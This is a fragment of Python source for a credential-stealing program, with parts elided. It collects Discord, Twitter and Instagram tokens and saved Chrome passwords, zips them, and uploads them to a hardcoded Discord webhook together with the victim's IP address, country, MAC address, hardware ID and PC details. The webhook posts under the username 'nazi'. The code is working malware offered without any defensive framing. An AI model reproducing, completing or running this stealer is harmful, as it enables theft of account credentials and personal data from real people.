...
narcis = socket.gethostbyname(hostname)
...
def send_webhook(DISCORD_WEBHOOK_URLs):
    ...
    with TemporaryDirectory(dir=".") as td:
        ...
        files_names = [
            [os.path.join(td, "Discord.txt"), discord_T],
            [os.path.join(td, "twitte.txt"), twitter_T],
            [os.path.join(td, "instagram.txt"), insta_T],
            [os.path.join(td, "passwords.txt"), chrome_Psw_t],
        ]
        ...
        for URL in DISCORD_WEBHOOK_URLs:
            webhook = DiscordWebhook(
                url=URL,
                username=f"nazi",
                avatar_url="https://cdn.discordapp.com/attachments/1121413584551944195/1121418563002044426/sticker.png",
            )
            embed = DiscordEmbed(title=f"{narcis}, | {os.getenv('UserName')}", color="ffffff")
            embed.add_embed_field(
                name="",
                value=f":seven:`PC Username:` *~~{os.getenv('UserName')}~~*\n:seven:`PC Name:` *~~{os.getenv('COMPUTERNAME')}~~*\n:seven:`OS:` *~~{platform()}~~*\n",
                inline=False,
            )
            embed.add_embed_field(
                name="",
                value=f":six:`IP:` *~~{p_lst[0]}~~*\n:six:`Country:` *~~{p_lst[1]}~~* \n:six:`MAC:` *~~{gma()}~~*\n:six:`HWID:` *~~{get_hwid()}~~*\n",
                inline=False,
            )
            with open(os.path.join(td, "data.zip"), "rb") as f:
                webhook.add_file(
                    file=f.read(),
                    filename=f"{narcis}.zip",
                )
...
if __name__ == "__main__":
    freeze_support()
    if len(sys.argv) == 1:
        send_webhook(["https://discord.com/api/webhooks/1121010911449198702/a8DkHy5ZXZKFExrGz5f95Q7N3nzf4Jt-YF5aqBTiZyHfYwYVlC2MHePk9HXc5YPc92ee"])
    else:
        del sys.argv[0]
